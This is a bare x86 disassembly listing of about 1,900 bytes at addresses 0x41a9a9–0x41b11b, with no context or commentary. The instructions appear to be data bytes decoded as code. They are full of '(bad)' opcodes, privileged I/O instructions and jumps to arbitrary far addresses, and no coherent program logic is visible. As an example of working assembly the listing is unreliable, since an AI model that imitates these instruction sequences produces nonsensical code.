  41a9a9:	dec    ebx
  41a9aa:	mov    al,0xc8
  41a9ac:	cmp    edi,ecx
  41a9ae:	mov    edi,DWORD PTR [edi+0x5f]
  41a9b1:	xor    BYTE PTR [edx+0x4],0xec
  41a9b5:	dec    ebx
  41a9b6:	lahf   
  41a9b7:	in     eax,0x5a
  41a9b9:	pop    DWORD PTR [eax+0x588e3efb]
  41a9bf:	xor    DWORD PTR [ebx-0x43],ebp
  41a9c2:	popf   
  41a9c3:	call   0x46ea:0x899fc5d3
  41a9ca:	cmp    al,0x4e
  41a9cc:	jecxz  0x41a970
  41a9ce:	daa    
  41a9cf:	xor    BYTE PTR [eax],dh
  41a9d1:	test   eax,0x3f97c4d5
  41a9d6:	scas   eax,DWORD PTR es:[edi]
  41a9d7:	and    al,0xaf
  41a9d9:	sbb    al,0xeb
  41a9db:	xor    esi,DWORD PTR [edx+edi*4]
  41a9de:	fild   DWORD PTR [edi]
  41a9e0:	call   0x74b2a74c
  41a9e5:	mov    dh,0x34
  41a9e7:	cmp    al,0x2f
  41a9e9:	pop    edi
  41a9ea:	sub    eax,ecx
  41a9ec:	cwde   
  41a9ed:	or     ebp,DWORD PTR ds:0xd919bae2
  41a9f3:	stc    
  41a9f4:	fld    QWORD PTR [eax+0x77]
  41a9f7:	enter  0xbe90,0x55
  41a9fb:	int    0xd8
  41a9fd:	sbb    eax,0x8131c735
  41aa02:	scas   al,BYTE PTR es:[edi]
  41aa03:	push   0xfffffff6
  41aa05:	(bad)
  41aa09:	or     BYTE PTR [ebx],al
  41aa0b:	pop    edx
  41aa0c:	aad    0x47
  41aa0e:	cmp    eax,0x87731e9f
  41aa13:	mov    cl,0xb9
  41aa15:	aaa    
  41aa16:	bswap  eax
  41aa18:	out    0x86,al
  41aa1a:	test   eax,0xd5efbfc5
  41aa1f:	xlat   BYTE PTR ds:[ebx]
  41aa20:	jmp    0x41aa2d
  41aa22:	mov    edx,0x4721fc95
  41aa27:	or     DWORD PTR [ecx-0x569db221],0xc9966b
  41aa31:	pop    ebx
  41aa32:	or     esp,DWORD PTR [edx-0x6902b77b]
  41aa38:	enter  0xceaf,0x86
  41aa3c:	dec    edx
  41aa3d:	shl    BYTE PTR [edx],cl
  41aa3f:	mov    bh,0x6a
  41aa41:	xchg   DWORD PTR [ebp-0x38],edx
  41aa44:	rcr    DWORD PTR [ebx+esi*8],cl
  41aa47:	sti    
  41aa48:	jl     0x41aa81
  41aa4a:	std    
  41aa4b:	std    
  41aa4c:	mov    esp,0x5a96c39f
  41aa51:	add    al,BYTE PTR [ebx+ecx*8+0x1e]
  41aa55:	or     DWORD PTR [esi],edi
  41aa57:	ror    BYTE PTR [ebx+ebx*8+0x44916264],0xd3
  41aa5f:	or     DWORD PTR [ebx+0x7b],0xfffffffd
  41aa63:	adc    al,cl
  41aa65:	inc    ecx
  41aa66:	fstp   QWORD PTR [edi]
  41aa68:	out    0xd9,eax
  41aa6a:	jle    0x41aab3
  41aa6c:	sbb    DWORD PTR [ebp+0x3d],esi
  41aa6f:	mov    ecx,0x3f1d072e
  41aa74:	jmp    0x41aac7
  41aa76:	xchg   dl,al
  41aa78:	add    eax,0x2d7414fe
  41aa7d:	fiadd  WORD PTR [esp+esi*8-0x39]
  41aa81:	fidivr DWORD PTR [edx+0x1e]
  41aa84:	repz and edi,ebx
  41aa87:	test   al,0xeb
  41aa89:	sbb    al,0x0
  41aa8b:	daa    
  41aa8c:	sub    ebx,DWORD PTR [edx]
  41aa8e:	loop   0x41aa8a
  41aa90:	fstp   st(5)
  41aa92:	(bad)  
  41aa94:	call   0xc71f:0xc0f44edd
  41aa9b:	dec    edx
  41aa9c:	int3   
  41aa9d:	or     ch,BYTE PTR [edx+0x759ff102]
  41aaa3:	inc    edx
  41aaa4:	dec    ecx
  41aaa5:	fild   WORD PTR [ecx+0x5e]
  41aaa8:	popa   
  41aaa9:	xchg   edi,eax
  41aaaa:	rol    DWORD PTR [ebp+0xfbc48eb],0xc5
  41aab1:	push   ebx
  41aab2:	into   
  41aab3:	push   ds
  41aab4:	adc    ah,al
  41aab6:	outs   dx,BYTE PTR ds:[esi]
  41aab7:	ror    esi,cl
  41aab9:	inc    esi
  41aaba:	mov    al,ds:0x7ccdad1b
  41aabf:	pusha  
  41aac0:	das    
  41aac1:	sub    eax,0x5c5c7400
  41aac6:	js     0x41ab0e
  41aac8:	ins    DWORD PTR es:[edi],dx
  41aac9:	aas    
  41aaca:	mov    edx,0xfddf42b1
  41aacf:	fld    TBYTE PTR [edi-0x4cfc0ca0]
  41aad5:	add    BYTE PTR gs:[ebp+eiz*8-0x5b541574],dl
  41aadd:	outs   dx,DWORD PTR ds:[esi]
  41aade:	sub    BYTE PTR [esi+0x15],0xec
  41aae2:	clc    
  41aae3:	xchg   BYTE PTR [ecx-0x3010df22],dh
  41aae9:	xor    edi,0x3
  41aaec:	lods   eax,DWORD PTR ds:[esi]
  41aaed:	cld    
  41aaee:	cld    
  41aaef:	inc    esi
  41aaf0:	(bad)  
  41aaf1:	inc    ecx
  41aaf2:	mov    esp,0xb1676aee
  41aaf7:	iret   
  41aaf8:	aad    0xf8
  41aafa:	dec    ebp
  41aafb:	sbb    ch,BYTE PTR [ebx]
  41aafd:	mov    edx,0x55d4542f
  41ab02:	cli    
  41ab03:	pop    ss
  41ab04:	mov    al,ds:0x66ee6820
  41ab09:	loope  0x41ab37
  41ab0b:	hlt    
  41ab0c:	inc    eax
  41ab0d:	vshufpd ymm4,ymm1,ymm7,0xfc
  41ab12:	sbb    esi,edx
  41ab14:	popf   
  41ab15:	fdivr  QWORD PTR [eax]
  41ab17:	imul   ebx,DWORD PTR [ebx+0x31],0x1fdd4714
  41ab1e:	add    eax,0x32cfd13f
  41ab23:	call   0x10b1e83b
  41ab28:	jge    0x41ab69
  41ab2a:	jbe    0x41ab2f
  41ab2c:	pop    ebp
  41ab2d:	fsubp  st(3),st
  41ab2f:	or     BYTE PTR [edi],ch
  41ab31:	push   esp
  41ab32:	into   
  41ab33:	xchg   ebp,edi
  41ab35:	push   ebx
  41ab36:	fcomp  st(5)
  41ab38:	inc    BYTE PTR [ebx-0x65941b77]
  41ab3e:	in     al,dx
  41ab3f:	jmp    0xd647:0x581fa8f4
  41ab46:	add    DWORD PTR [ebx+ebp*1],0xffffff94
  41ab4a:	jl     0x41ab7d
  41ab4c:	adc    eax,0xe608d740
  41ab51:	jb     0x41ab85
  41ab53:	dec    esp
  41ab54:	jno    0x41ab15
  41ab56:	int3   
  41ab57:	sub    esi,DWORD PTR [esi+0x49]
  41ab5a:	dec    edx
  41ab5b:	enter  0x853d,0xb3
  41ab5f:	xchg   edi,eax
  41ab60:	pop    esi
  41ab61:	dec    esp
  41ab62:	into   
  41ab63:	and    al,0xeb
  41ab65:	sbb    BYTE PTR [ebp-0x26],ch
  41ab68:	xchg   ecx,eax
  41ab69:	aam    0x3f
  41ab6b:	(bad)  
  41ab6c:	xchg   edi,eax
  41ab6d:	fisttp WORD PTR ds:0x5fd6ea2
  41ab73:	je     0x41ab0d
  41ab75:	adc    edi,ebp
  41ab77:	in     al,0x70
  41ab79:	jnp    0x41ab4f
  41ab7b:	cs cs stc 
  41ab7e:	push   ecx
  41ab7f:	enter  0x950b,0x87
  41ab83:	sub    eax,0x94a6e1b4
  41ab88:	jmp    0x41ab67
  41ab8a:	jb     0x41abf6
  41ab8c:	jecxz  0x41ab7a
  41ab8e:	jae    0x41abf3
  41ab90:	push   esi
  41ab91:	pop    es
  41ab92:	fst    QWORD PTR [eax]
  41ab94:	ins    BYTE PTR es:[edi],dx
  41ab95:	jmp    0x1c8e:0xc56a23bb
  41ab9c:	out    0x31,al
  41ab9e:	add    BYTE PTR [edx+0x2725997f],bh
  41aba4:	adc    cl,BYTE PTR [edi+0x34]
  41aba7:	pop    ebx
  41aba8:	(bad)  
  41abaa:	mov    eax,0xef947a56
  41abaf:	pop    edi
  41abb0:	clc    
  41abb1:	cmp    ch,0x45
  41abb4:	lds    ebp,FWORD PTR [edx+0x32]
  41abb7:	mov    DWORD PTR ds:0x29c9e12e,0x16f1572a
  41abc1:	in     al,dx
  41abc2:	mov    esp,0x13aed6e
  41abc7:	int3   
  41abc8:	cmp    ch,BYTE PTR [edx+0x345fca7c]
  41abce:	mov    ebp,0x83dffc70
  41abd3:	jle    0x41abf7
  41abd5:	ret    0x67a3
  41abd8:	rcl    DWORD PTR [edx],cl
  41abda:	or     al,0xf1
  41abdc:	mov    edx,0x6d22f69d
  41abe1:	ins    BYTE PTR es:[edi],dx
  41abe2:	std    
  41abe3:	xor    dl,BYTE PTR [ebp-0x13]
  41abe6:	xchg   BYTE PTR [eax+ecx*2+0x4f],ch
  41abea:	mov    ds:0x40f02f9f,al
  41abef:	mov    ds:0xd237df53,al
  41abf4:	sbb    al,0xe3
  41abf6:	adc    DWORD PTR [ebx],0xffffffeb
  41abf9:	gs stos BYTE PTR es:[edi],al
  41abfb:	in     eax,0xb5
  41abfd:	cmp    BYTE PTR ds:0xabdf6473,ch
  41ac03:	dec    BYTE PTR [edx-0x36]
  41ac06:	aad    0x48
  41ac08:	(bad)  
  41ac09:	sar    esp,0x5
  41ac0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac0d:	push   DWORD PTR [esi]
  41ac0f:	xchg   BYTE PTR [ebx],ch
  41ac11:	outs   dx,DWORD PTR ds:[esi]
  41ac12:	dec    eax
  41ac13:	and    al,0xf5
  41ac15:	fistp  WORD PTR [edx-0x4c]
  41ac18:	add    eax,0x9de6a807
  41ac1d:	cmc    
  41ac1e:	cwde   
  41ac1f:	daa    
  41ac20:	jmp    0xe76aaced
  41ac25:	push   edi
  41ac26:	push   ecx
  41ac27:	test   al,0x81
  41ac29:	ins    DWORD PTR es:[edi],dx
  41ac2a:	push   ds
  41ac2b:	enter  0xc533,0xcc
  41ac2f:	int3   
  41ac30:	jno    0x41ac5e
  41ac32:	(bad)  
  41ac33:	and    esp,eax
  41ac35:	nop
  41ac36:	xchg   ecx,eax
  41ac37:	mov    esi,0x287d6857
  41ac3c:	xchg   BYTE PTR [esi+0x44],cl
  41ac3f:	gs call 0x8508f78a
  41ac45:	ins    BYTE PTR es:[edi],dx
  41ac46:	pop    ds
  41ac47:	lea    ecx,[edi-0x34]
  41ac4a:	outs   dx,DWORD PTR ds:[esi]
  41ac4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac4c:	sub    edx,ebp
  41ac4e:	popf   
  41ac4f:	mov    al,ds:0x6662b4eb
  41ac54:	inc    ecx
  41ac55:	and    DWORD PTR [eax+0x58dfdb6e],ebx
  41ac5b:	cmp    esi,DWORD PTR [ecx-0x2f]
  41ac5e:	or     eax,0xfd5463ee
  41ac63:	inc    edi
  41ac64:	xor    al,0xdb
  41ac66:	mov    eax,ds:0x4ce2ec7
  41ac6b:	enter  0x517b,0x92
  41ac6f:	sub    ch,BYTE PTR [ebx-0x1414b30f]
  41ac75:	pop    ss
  41ac76:	iret   
  41ac77:	mov    dl,BYTE PTR [ebx+eax*2-0x30]
  41ac7b:	inc    ebp
  41ac7c:	loopne 0x41ac6e
  41ac7e:	(bad)  
  41ac7f:	aas    
  41ac80:	xchg   ecx,eax
  41ac81:	fcomip st,st(5)
  41ac83:	ins    DWORD PTR es:[edi],dx
  41ac84:	push   ss
  41ac85:	xor    eax,0x91eb870e
  41ac8a:	into   
  41ac8b:	daa    
  41ac8c:	or     al,0x48
  41ac8e:	or     ah,BYTE PTR [edi+0x4]
  41ac91:	fidivr DWORD PTR [edx+0x3d72d2e6]
  41ac97:	jmp    0xf6900c71
  41ac9c:	jmp    0x41ac2b
  41ac9e:	xchg   BYTE PTR [ecx],dl
  41aca0:	push   es
  41aca1:	std    
  41aca2:	call   0xb210c66
  41aca7:	leave  
  41aca8:	dec    esp
  41aca9:	repz mov bl,0x8c
  41acac:	mov    al,0x7
  41acae:	cld    
  41acaf:	retf   0x78b1
  41acb2:	lgs    ebx,FWORD PTR [ebx]
  41acb5:	imul   edx,DWORD PTR [eax-0x225a9af8],0x67
  41acbc:	test   eax,0xd18fd1c
  41acc1:	test   eax,0x8c4da790
  41acc6:	(bad)  
  41acc7:	mov    ebp,0xc80c27f4
  41accc:	push   edx
  41accd:	and    al,0xbb
  41accf:	jns    0x41ace4
  41acd1:	pop    ecx
  41acd2:	scas   eax,DWORD PTR es:[edi]
  41acd3:	fsubp  st(3),st
  41acd5:	cmp    eax,0xb44d872f
  41acda:	mov    ds,WORD PTR [ebx]
  41acdc:	push   ss
  41acdd:	fisttp WORD PTR [esi+eax*2-0x458056d1]
  41ace4:	test   BYTE PTR [eax-0x3],0x32
  41ace8:	push   edx
  41ace9:	out    dx,eax
  41acea:	push   eax
  41aceb:	jg     0x41ad4a
  41aced:	pop    ds
  41acee:	inc    edx
  41acef:	enter  0xba37,0x19
  41acf3:	lds    edi,FWORD PTR [edi]
  41acf5:	(bad)  
  41acf6:	fdiv   DWORD PTR [ecx-0x15]
  41acf9:	daa    
  41acfa:	sub    esp,DWORD PTR [esi+0x2f1718c8]
  41ad00:	(bad)  
  41ad01:	fild   QWORD PTR [edx+0x79]
  41ad04:	out    0x8,al
  41ad06:	(bad)  
  41ad07:	test   eax,0xb9250984
  41ad0c:	jecxz  0x41ad12
  41ad0e:	xor    ecx,DWORD PTR [ebx+0x64]
  41ad11:	xchg   ebp,eax
  41ad12:	out    0xea,al
  41ad14:	dec    esi
  41ad15:	pop    ss
  41ad16:	sub    al,0x55
  41ad18:	cwde   
  41ad19:	fimul  WORD PTR [ebx+ebp*4]
  41ad1c:	mov    DWORD PTR [ebx],edx
  41ad1e:	or     al,0x2f
  41ad20:	pop    ds
  41ad21:	dec    edi
  41ad22:	retf   
  41ad23:	or     bl,ch
  41ad25:	call   0x6965:0xf9b856cf
  41ad2c:	xchg   eax,edx
  41ad2e:	ins    BYTE PTR es:[edi],dx
  41ad2f:	enter  0x7cb3,0x48
  41ad33:	leave  
  41ad34:	cdq    
  41ad35:	out    0x89,al
  41ad37:	xchg   bl,ch
  41ad39:	push   ds
  41ad3a:	push   0xffffffe5
  41ad3c:	gs lock push edx
  41ad3f:	fwait
  41ad40:	test   DWORD PTR [edx+0x1d],0xf8df4e45
  41ad47:	ror    DWORD PTR [ecx-0x24],cl
  41ad4a:	dec    ebp
  41ad4b:	dec    ecx
  41ad4c:	inc    ch
  41ad4e:	and    esp,ecx
  41ad50:	jmp    0x41adcc
  41ad52:	jo     0x41adad
  41ad54:	int3   
  41ad55:	ficom  WORD PTR [eax-0x4620423a]
  41ad5b:	push   edi
  41ad5c:	into   
  41ad5d:	xchg   ecx,eax
  41ad5e:	in     al,0x15
  41ad60:	das    
  41ad61:	ja     0x41adc0
  41ad63:	xor    bh,BYTE PTR ds:0x72f4fe26
  41ad69:	fadd   DWORD PTR [edi]
  41ad6b:	outs   dx,DWORD PTR ds:[esi]
  41ad6c:	push   es
  41ad6d:	and    al,0x9d
  41ad6f:	mov    ebx,0xf322dff8
  41ad74:	and    DWORD PTR [edx+0x44],eax
  41ad77:	push   edx
  41ad78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad79:	xor    bh,ch
  41ad7b:	nop
  41ad7c:	cmp    eax,0x12bee58e
  41ad81:	jne    0x41ad0d
  41ad83:	enter  0x884e,0x32
  41ad87:	rcr    DWORD PTR [edx-0x79],1
  41ad8a:	push   0xffffffa3
  41ad8c:	jmp    0x41ad18
  41ad8e:	pop    ecx
  41ad8f:	add    esi,DWORD PTR [ecx+ebp*1]
  41ad92:	out    dx,eax
  41ad93:	jno    0x41adbb
  41ad95:	shl    DWORD PTR [edx+0x66ebbac8],1
  41ad9b:	mov    edx,0xe9b442a5
  41ada0:	jmp    0x41add3
  41ada2:	jmp    0x41ad71
  41ada4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ada5:	xchg   esi,eax
  41ada6:	xchg   edx,eax
  41ada7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ada8:	push   ecx
  41ada9:	fild   WORD PTR [eax-0x17ef6a20]
  41adaf:	jns    0x41ae19
  41adb1:	mov    ds:0x70989afb,al
  41adb6:	retf   
  41adb7:	cmp    BYTE PTR [ebx],cl
  41adb9:	dec    edx
  41adba:	pop    edx
  41adbb:	dec    ebx
  41adbc:	jmp    0x1d35dca0
  41adc1:	inc    esi
  41adc2:	adc    edi,DWORD PTR [ebp-0x2]
  41adc5:	xlat   BYTE PTR ds:[ebx]
  41adc6:	cld    
  41adc7:	mov    ebp,0x66e4d403
  41adcc:	mov    bh,0x51
  41adce:	dec    esp
  41adcf:	enter  0x3011,0x8c
  41add3:	sub    BYTE PTR [esi+0x24],cl
  41add6:	mov    bh,BYTE PTR [edi-0x15]
  41add9:	mov    ch,0x67
  41addb:	adc    esp,DWORD PTR [ecx]
  41addd:	dec    ebp
  41adde:	test   ecx,edi
  41ade0:	jmp    0x3269:0xf9c561df
  41ade7:	mov    ?,WORD PTR [edx-0x12]
  41adea:	loop   0x41ad88
  41adec:	imul   ebx,DWORD PTR [edi-0xc],0x779cd5e3
  41adf3:	pop    ebp
  41adf4:	xor    eax,0xbd868edf
  41adf9:	in     eax,dx
  41adfa:	jecxz  0x41adc5
  41adfc:	imul   ebp,DWORD PTR [ebp+0xa4f0bfd],0x5d
  41ae03:	and    eax,0xc1dcde81
  41ae08:	int3   
  41ae09:	fmul   QWORD PTR [esp+eax*8+0x6b4d2911]
  41ae10:	and    edx,DWORD PTR [eax-0x30146498]
  41ae16:	xchg   esp,eax
  41ae17:	xchg   ebp,eax
  41ae18:	rcr    DWORD PTR [ebx+esi*8+0x37e25b35],1
  41ae1f:	mov    bh,dh
  41ae21:	test   eax,0x61a047de
  41ae26:	pop    ebx
  41ae27:	(bad)  
  41ae28:	mov    edi,0x1cbcd8ce
  41ae2d:	leave  
  41ae2e:	cld    
  41ae2f:	jbe    0x41adfd
  41ae31:	das    
  41ae32:	dec    esi
  41ae33:	out    0x93,al
  41ae35:	fucomip st,st(1)
  41ae37:	or     eax,0xcd5e6987
  41ae3c:	addr16 mov bl,0xfc
  41ae3f:	xlat   BYTE PTR ds:[ebx]
  41ae40:	add    DWORD PTR [edx+0x65b8a724],edx
  41ae46:	ins    DWORD PTR es:[edi],dx
  41ae47:	enter  0x411a,0xf1
  41ae4b:	mov    bl,0x73
  41ae4d:	push   es
  41ae4e:	call   FWORD PTR [esi]
  41ae50:	jmp    0x41ae32
  41ae52:	and    BYTE PTR [edx+edi*4],al
  41ae55:	or     BYTE PTR [bp-0x5c],bh
  41ae59:	or     DWORD PTR [ecx+ebx*1],edx
  41ae5c:	jmp    0x41aecb
  41ae5e:	pop    esi
  41ae5f:	hlt    
  41ae60:	shl    DWORD PTR [edx+0x42],cl
  41ae63:	add    ch,0x16
  41ae66:	out    dx,al
  41ae67:	hlt    
  41ae68:	in     al,dx
  41ae69:	jp     0x41aebc
  41ae6b:	mov    dh,bl
  41ae6d:	pop    edx
  41ae6e:	rol    DWORD PTR [esi+0x26b2df69],0x38
  41ae75:	js     0x41ae90
  41ae77:	adc    ebx,ecx
  41ae79:	ret    0xb4fc
  41ae7c:	dec    ecx
  41ae7d:	xchg   ebx,eax
  41ae7e:	bound  edi,QWORD PTR [esi]
  41ae80:	lods   eax,DWORD PTR ds:[esi]
  41ae81:	xor    bh,al
  41ae83:	leave  
  41ae84:	add    al,0xf7
  41ae86:	sbb    bh,BYTE PTR [edi+0x2c]
  41ae89:	sahf   
  41ae8a:	add    ecx,DWORD PTR [edi*1+0x6675f416]
  41ae91:	cmp    ah,ch
  41ae93:	inc    edi
  41ae94:	shl    BYTE PTR [ecx-0x5e],1
  41ae97:	data16 or al,0xde
  41ae9a:	push   ecx
  41ae9b:	pusha  
  41ae9c:	add    al,BYTE PTR [esi]
  41ae9e:	imul   esi,DWORD PTR [eax],0x74
  41aea1:	dec    ebx
  41aea2:	xlat   BYTE PTR ds:[ebx]
  41aea3:	test   eax,0x2c2741ea
  41aea8:	ret    
  41aea9:	(bad)  
  41aeaa:	lea    eax,[eax+0x50]
  41aead:	push   esp
  41aeae:	pop    es
  41aeaf:	test   al,0xcc
  41aeb1:	int    0x72
  41aeb3:	and    dl,BYTE PTR [ecx+0x5a5cfcc6]
  41aeb9:	mov    dh,0xb9
  41aebb:	div    DWORD PTR [eax+0x4bc94608]
  41aec1:	gs or  eax,0x67bdb6ee
  41aec7:	cwde   
  41aec8:	mov    esi,0xb396fb96
  41aecd:	push   edi
  41aece:	xchg   ebx,eax
  41aecf:	pop    edi
  41aed0:	sti    
  41aed1:	mov    ch,0x75
  41aed3:	pop    esi
  41aed4:	out    dx,al
  41aed5:	jmp    0x41ae7e
  41aed7:	aam    0x8f
  41aed9:	fbstp  TBYTE PTR [edi]
  41aedb:	shl    DWORD PTR [eax-0x16],cl
  41aede:	or     DWORD PTR [eax+0xe610cff],edi
  41aee4:	ins    BYTE PTR es:[edi],dx
  41aee5:	call   0x21bd:0x4e2b3e46
  41aeec:	pop    ds
  41aeed:	ffreep st(5)
  41aeef:	call   0x3f3fe64b
  41aef4:	cmp    esp,DWORD PTR [ebx-0x4]
  41aef7:	adc    ebx,DWORD PTR [eax]
  41aef9:	lea    ebx,[ebx]
  41aefb:	pushf  
  41aefc:	sub    eax,DWORD PTR [edi+edx*2]
  41aeff:	jmp    0xbf1c8efc
  41af04:	sahf   
  41af05:	adc    dh,BYTE PTR [eax-0x181440cd]
  41af0b:	adc    DWORD PTR [ebx-0x145ace17],ebp
  41af11:	retf   0x3c64
  41af14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af15:	or     eax,0xe8ec806
  41af1a:	or     DWORD PTR [ebp-0x74],0x3a
  41af1e:	pop    esp
  41af1f:	adc    eax,0x3f5a26eb
  41af24:	xor    eax,0x236ea25
  41af29:	loopne 0x41aeed
  41af2b:	das    
  41af2c:	mov    dh,0x2e
  41af2e:	xchg   ebx,eax
  41af2f:	dec    edi
  41af30:	lds    eax,FWORD PTR [edx]
  41af32:	std    
  41af33:	stos   BYTE PTR es:[edi],al
  41af34:	jge    0x41aed5
  41af36:	mov    ebp,0x9ad2c0f2
  41af3b:	enter  0x7337,0xea
  41af3f:	cld    
  41af40:	imul   DWORD PTR [ebx+0x67eb13cf]
  41af46:	or     edx,DWORD PTR [ebp+0xc]
  41af49:	jno    0x41af28
  41af4b:	js     0x41af2c
  41af4d:	into   
  41af4e:	adc    eax,0xea9814c8
  41af53:	cmp    cl,bl
  41af55:	sub    eax,0xdbee7226
  41af5a:	daa    
  41af5b:	cmp    bl,BYTE PTR [ebx]
  41af5d:	fild   WORD PTR [edi]
  41af5f:	stos   BYTE PTR es:[edi],al
  41af60:	and    BYTE PTR [edi],bl
  41af62:	not    DWORD PTR [ebx]
  41af64:	imul   eax,DWORD PTR [ecx-0x4f],0xffffffc8
  41af68:	push   cs
  41af69:	xchg   ebx,eax
  41af6a:	rcr    DWORD PTR [ecx+0x4],cl
  41af6d:	add    edi,DWORD PTR ds:0x3b1ede1
  41af73:	jg     0x41afdb
  41af75:	pop    esi
  41af76:	jp     0x41af70
  41af78:	idiv   eax
  41af7a:	sar    BYTE PTR [edi+esi*2],0xdf
  41af7e:	inc    ecx
  41af7f:	loopne 0x41af48
  41af81:	std    
  41af82:	inc    esi
  41af83:	shr    BYTE PTR [ebx-0x142cd54a],1
  41af89:	cmp    DWORD PTR [esi+edi*8+0x12ab58ec],edx
  41af90:	dec    ebx
  41af91:	fdivp  st(6),st
  41af93:	retf   0xf3c7
  41af96:	dec    edi
  41af97:	push   ds
  41af98:	sub    DWORD PTR [edi],ebp
  41af9a:	mov    dl,0x1a
  41af9c:	jmp    0x41b019
  41af9e:	mov    eax,0xbbd42b75
  41afa3:	ins    DWORD PTR es:[edi],dx
  41afa4:	jbe    0x41afdf
  41afa6:	jp     0x41af70
  41afa8:	add    DWORD PTR [ebp-0x382922d9],0x82eb92ec
  41afb2:	sti    
  41afb3:	stos   BYTE PTR es:[edi],al
  41afb4:	mov    bh,0xf6
  41afb6:	retf   0x92b9
  41afb9:	jmp    0xfb1d:0x9fc352da
  41afc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afc1:	xor    BYTE PTR [esi],al
  41afc3:	(bad)  
  41afc4:	jmp    0x41afbf
  41afc6:	cdq    
  41afc7:	mov    ds:0x3b8337f9,al
  41afcc:	push   es
  41afcd:	(bad)  
  41afcf:	in     al,0x0
  41afd1:	mov    al,ds:0x8b553fef
  41afd6:	loope  0x41afda
  41afd8:	push   edx
  41afd9:	fistp  WORD PTR [ebp+0x45e772c7]
  41afdf:	pop    edx
  41afe0:	sbb    bh,bl
  41afe2:	cmp    eax,0xb87faa6c
  41afe7:	and    al,0x93
  41afe9:	xchg   esi,eax
  41afea:	cld    
  41afeb:	repnz hlt 
  41afed:	dec    ecx
  41afee:	push   0xebbeb3e3
  41aff3:	ficom  WORD PTR [ecx+0x7ecf7d3b]
  41aff9:	mov    ebp,0xa6046156
  41affe:	jmp    FWORD PTR [edi+0x44c6c7cc]
  41b004:	sbb    eax,0xa873606f
  41b009:	fimul  WORD PTR [edi+0x70]
  41b00c:	sbb    ebp,ebp
  41b00e:	sub    bh,dh
  41b010:	push   0x9010958a
  41b015:	fnstsw WORD PTR [ecx-0x258e81b0]
  41b01b:	xchg   DWORD PTR [edx-0x55],ebx
  41b01e:	stos   BYTE PTR es:[edi],al
  41b01f:	enter  0x78ce,0x77
  41b023:	jbe    0x41b095
  41b025:	adc    al,0xa1
  41b027:	je     0x41b027
  41b029:	out    0xe0,al
  41b02b:	dec    esi
  41b02c:	ss hlt 
  41b02e:	cld    
  41b02f:	jo     0x41b019
  41b031:	jp     0x41b002
  41b033:	leave  
  41b034:	sbb    esp,ebx
  41b036:	stos   DWORD PTR es:[edi],eax
  41b037:	inc    edi
  41b038:	ret    
  41b039:	(bad)  
  41b03b:	push   cs
  41b03c:	cmp    eax,edx
  41b03e:	idiv   DWORD PTR [ebx-0x15]
  41b041:	mov    edi,0x906a38b
  41b046:	pop    ebp
  41b047:	div    DWORD PTR [ecx]
  41b049:	pop    es
  41b04a:	outs   dx,DWORD PTR ds:[esi]
  41b04b:	ret    0x32eb
  41b04e:	into   
  41b04f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b050:	mov    edx,0xa131b689
  41b055:	xchg   ebp,eax
  41b056:	std    
  41b057:	scas   eax,DWORD PTR es:[edi]
  41b058:	and    eax,0x6aa3c1bc
  41b05d:	and    eax,0x63ab58a4
  41b062:	rol    edi,1
  41b064:	jb     0x41b01a
  41b066:	iret   
  41b067:	out    dx,eax
  41b068:	pop    ebp
  41b069:	out    dx,al
  41b06a:	sti    
  41b06b:	mov    esi,0x2b2900eb
  41b070:	stc    
  41b071:	sub    bh,0x96
  41b074:	mov    ds:0xb35f46df,al
  41b079:	hlt    
  41b07a:	lods   eax,DWORD PTR ds:[esi]
  41b07b:	stc    
  41b07c:	mov    cl,0x6a
  41b07e:	std    
  41b07f:	mov    esp,0x317279f2
  41b084:	inc    edx
  41b085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b086:	loop   0x41b04e
  41b088:	ret    
  41b089:	jl     0x41b0b5
  41b08b:	push   ecx
  41b08c:	shr    BYTE PTR [edi-0x4b],1
  41b08f:	jb     0x41b10e
  41b091:	std    
  41b092:	cld    
  41b093:	int    0xa5
  41b095:	lock test al,0xd7
  41b098:	fimul  WORD PTR [edi+0xb1cc85b]
  41b09e:	in     eax,0xd9
  41b0a0:	push   eax
  41b0a1:	fidiv  DWORD PTR [ecx-0x65]
  41b0a4:	jmp    0x41b0a8
  41b0a6:	je     0x41b078
  41b0a8:	sbb    eax,DWORD PTR [edx-0x64]
  41b0ab:	ds push cs
  41b0ad:	mov    DWORD PTR [eax],0xb8c1a6c8
  41b0b3:	push   edx
  41b0b4:	dec    eax
  41b0b5:	fdivr  DWORD PTR [edi+0x48]
  41b0b8:	jmp    0x41b0c2
  41b0ba:	sub    al,0x11
  41b0bc:	sbb    al,0x7f
  41b0be:	fadd   DWORD PTR [ebp+0x39dddf0f]
  41b0c4:	je     0x41b0c2
  41b0c6:	pop    eax
  41b0c7:	push   cs
  41b0c8:	rcr    DWORD PTR ds:0x3ad81cfd,cl
  41b0ce:	dec    esp
  41b0cf:	fsubr  DWORD PTR [eax-0x57]
  41b0d2:	push   esp
  41b0d3:	(bad)  
  41b0d4:	cmp    eax,0x7e69af2f
  41b0d9:	dec    edi
  41b0da:	push   esp
  41b0db:	cdq    
  41b0dc:	jmp    FWORD PTR [eax]
  41b0de:	and    DWORD PTR [ecx-0x15],ebx
  41b0e1:	(bad)  
  41b0e2:	pop    ecx
  41b0e3:	outs   dx,BYTE PTR ds:[esi]
  41b0e4:	out    dx,eax
  41b0e5:	adc    esp,DWORD PTR [eax+0x211f7f56]
  41b0eb:	leave  
  41b0ec:	jp     0x41b166
  41b0ee:	fwait
  41b0ef:	mov    al,0xeb
  41b0f1:	int3   
  41b0f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0f3:	mov    BYTE PTR [edx+0xd1a8bfa],ah
  41b0f9:	fisttp WORD PTR [ebx+ebx*8+0x25]
  41b0fd:	sbb    edi,DWORD PTR [edx-0x2d57fea]
  41b103:	sub    al,0x64
  41b105:	in     eax,dx
  41b106:	aam    0x35
  41b108:	(bad)  
  41b109:	fnsave [ecx]
  41b10b:	enter  0x53a1,0x1a
  41b10f:	jl     0x41b0d1
  41b111:	das    
  41b112:	and    ah,0xe9
  41b115:	ficomp WORD PTR [eax]
  41b117:	aam    0x7c
  41b119:	(bad)  
  41b11b:	daa    
